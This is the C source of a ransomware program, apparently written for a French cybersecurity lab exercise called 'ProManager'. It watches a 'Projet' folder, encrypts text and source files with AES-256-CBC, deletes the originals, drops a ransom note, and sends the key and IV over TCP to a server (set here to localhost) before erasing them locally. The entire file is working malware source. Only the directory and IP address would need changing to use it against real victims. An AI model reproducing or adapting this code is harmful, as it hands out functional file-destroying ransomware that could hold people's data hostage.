#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#define BUFFER_SIZE 4096
#define PROJET_DIR "Projet"
#define CLE_FILE "cle.key"
#define IV_FILE "cle.iv"
#define RANCON_FILE "Projet/RANÇON.txt"
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 4242

// Vérifie les extensions à chiffrer
int extension_valide(const char *filename) {
    return strstr(filename, ".txt") || strstr(filename, ".md") || strstr(filename, ".c") || strstr(filename, ".h");
}

// Chiffre un fichier en AES-256-CBC avec OpenSSL
void chiffrer_fichier(const char *input, const char *output, unsigned char *key, unsigned char *iv) {
    FILE *in = fopen(input, "rb");
    FILE *out = fopen(output, "wb");
    if (!in || !out) { perror("Erreur fichiers"); return; }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, in)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out);
    }

    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    remove(input);  // Supprime l'original
}

// Crée le message de rançon
void generer_rancon() {
    FILE *f = fopen(RANCON_FILE, "w");
    if (!f) { perror("Erreur rançon"); return; }

    fprintf(f,
    "#########################################\n"
    "#        ❌  FICHIERS CHIFFRÉS  ❌       #\n"
    "#########################################\n\n"
    "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
    "car la date limite de remise du projet a été dépassée.\n\n"
    "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n"
    "Ne tentez pas de modifier les fichiers `.enc`.\n\n"
    "-----------------------------------------\n"
    "Pour récupérer vos fichiers :\n"
    "1. Lancez `client_decrypt`.\n"
    "2. Connectez-vous à 127.0.0.1:4242.\n"
    "3. Envoyez une justification (20+ caractères).\n"
    "4. Si acceptée, la clé et l’IV seront renvoyés.\n\n"
    "TP Cybersécurité – ProManager\n");
    fclose(f);
}

// Génère une clé AES + IV et les stocke
void generer_cle_iv(unsigned char *key, unsigned char *iv) {
    RAND_bytes(key, 32);
    RAND_bytes(iv, 16);

    FILE *fk = fopen(CLE_FILE, "wb");
    FILE *fv = fopen(IV_FILE, "wb");
    fwrite(key, 1, 32, fk);
    fwrite(iv, 1, 16, fv);
    fclose(fk);
    fclose(fv);
}

// Envoie la clé/IV au serveur distant via TCP
void envoyer_cle_iv_au_serveur() {
    FILE *k = fopen(CLE_FILE, "rb");
    FILE *v = fopen(IV_FILE, "rb");
    if (!k || !v) { perror("Erreur lecture clé/IV"); return; }

    unsigned char key[32], iv[16];
    fread(key, 1, 32, k);
    fread(iv, 1, 16, v);
    fclose(k);
    fclose(v);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("Connexion échouée");
        return;
    }

    // Envoi des clés
    send(sock, key, 32, 0);
    send(sock, iv, 16, 0);
    close(sock);

    // Suppression des clés locales
    remove(CLE_FILE);
    remove(IV_FILE);
    printf("[INFO] Clé et IV envoyés au serveur et supprimés localement.\n");
}

int main() {
    printf("[INFO] Surveillance du dossier '%s'...\n", PROJET_DIR);

    // Surveillance du dossier
    while (access(PROJET_DIR, F_OK) != 0)
        sleep(5);

    printf("[INFO] Dossier détecté. Déclenchement dans 30 secondes...\n");
    sleep(30);  // Pour tests, 3600 pour 1h

    unsigned char key[32], iv[16];
    generer_cle_iv(key, iv);

    // Chiffrement des fichiers
    DIR *dir = opendir(PROJET_DIR);
    struct dirent *entry;
    char input[256], output[256];

    while ((entry = readdir(dir))) {
        if (entry->d_type == DT_REG && extension_valide(entry->d_name)) {
            sprintf(input, "%s/%s", PROJET_DIR, entry->d_name);
            sprintf(output, "%s.enc", input);
            printf("[INFO] Chiffrement : %s\n", entry->d_name);
            chiffrer_fichier(input, output, key, iv);
        }
    }
    closedir(dir);

    generer_rancon();
    printf("[INFO] RANÇON.txt généré.\n");

    // Lancer le serveur AVANT d’envoyer la clé
    printf("[INFO] Lancement de serveur_pardon...\n");
    if (fork() == 0) {
        execl("./serveur_pardon", "./serveur_pardon", NULL);
        perror("Erreur lancement serveur_pardon");
        exit(EXIT_FAILURE);
    }

    sleep(1);  // Donne au serveur le temps de démarrer
    envoyer_cle_iv_au_serveur();

    printf("[OK] Ransomware terminé.\n");
    return 0;
}
